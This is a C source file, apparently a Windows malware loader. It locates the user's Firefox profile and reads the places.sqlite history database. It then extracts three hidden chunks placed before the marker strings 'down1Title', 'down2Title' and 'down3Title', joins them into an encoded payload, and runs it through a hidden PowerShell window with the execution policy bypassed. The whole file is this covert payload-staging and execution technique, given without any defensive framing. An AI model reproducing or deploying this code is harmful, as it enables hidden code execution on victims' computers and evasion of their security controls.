#include <stdio.h>
#include <string.h>
#include <stdlib.h>




    
    


int main(int argc, char **argv) {
   char* home = getenv("HOMEPATH");
	char* initpath = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
	
	size_t pathLen = strlen(home) + strlen(initpath) + 1;
	char* fullpath = malloc(pathLen);
	
	strcpy(fullpath, home);
	strcat(fullpath, initpath);
    
    //FILE* firePath= fopen(fullpath, "r");
	
	char* dirName = "*.default-release";
	size_t dirPath = strlen(fullpath) + strlen(dirName)+1;

	char* dirfullPath = malloc(dirPath);
	strcpy(dirfullPath, fullpath);
	strcat(dirfullPath, dirName);
	char * dirPart = "dir /b ";
	
	char *dircmd = malloc(strlen(dirPart) + strlen(dirfullPath));
	strcpy(dircmd, dirPart);
	strcat(dircmd, dirfullPath);
	//printf("==> %s\n", dircmd);
	
	
	FILE *fp;
	char path[1024];
	fp = popen(dircmd, "r");

while (fgets(path, sizeof(path), fp) != NULL) {
    //printf("%s", path);
  }
	int i;
	for (i=0; i<strlen(path); i++){
		if(path[i] == '\n')
			path[i] = 0;
	}
	//printf("%s\n", path);
	char * db = "\\places.sqlite";
	//char * c = "c:";
	//printf("==> %s", path);
 char * finalPath = malloc(strlen(fullpath) + strlen(path) + strlen(db)+ 1);
 strcpy(finalPath, fullpath);
 strcat(finalPath, path); 
 strcat(finalPath, db);
  pclose(fp); 
	//printf("%s\n", finalPath);
	
	FILE * fp2 = fopen(finalPath, "r");	
	
	
    
    
    char ch;
    char begin[10] = "my";
    char *end = "down1Title";
    char *end2 = "down2Title";
    char *end3 = "down3Title";
    char *file;
    long len;
    
    char * ShellPart1;
    char * ShellPart2;
    char * ShellPart3;
	
	

	
    int shell1Len = 1898;
    int shell2Len = 1898;
    int shell3Len = 1900;
    char *p;
	
	ShellPart1 = calloc(shell1Len + 1, sizeof(char));
	ShellPart2 = calloc(shell2Len + 1, sizeof(char));
	ShellPart3 = calloc(shell3Len + 1, sizeof(char));

	
	
       
	fseek(fp2, 0, SEEK_END);
	len = ftell(fp2);
    file = (char*)malloc(sizeof(char)*len);
    rewind(fp2);
	fread(file,1,len,fp2);
    fclose(fp2);
	
	for(i=0; i<len; i++){
		if(file[i] == '\0')
			file[i] = '\xFF';

	}
	
	p = strstr(file, end);
	if(p){
		memcpy(ShellPart1, p-shell1Len, shell1Len);
		
	}
	
	p = strstr(file, end2);
	if(p){
		memcpy(ShellPart2, p-shell2Len, shell2Len);
		
	}

	p = strstr(file, end3);
	if(p){
		memcpy(ShellPart3, p-shell3Len, shell3Len);
		
	}
 
	
	char * fullShell;
	fullShell = calloc(shell1Len + shell2Len + shell3Len+1, sizeof(char)); 
	
    strcat(fullShell, ShellPart1);
    
    strcat(fullShell, ShellPart2);
	strcat(fullShell, ShellPart3);
    
    char cmd[7000];
    sprintf(cmd, "powershell.exe -W Hidden -nop -ep bypass -NoExit -E %s", fullShell);
	system(cmd);
	
	

    
	free(finalPath);
	free(fullpath);
	free(dirfullPath);
    
    return 0;
}
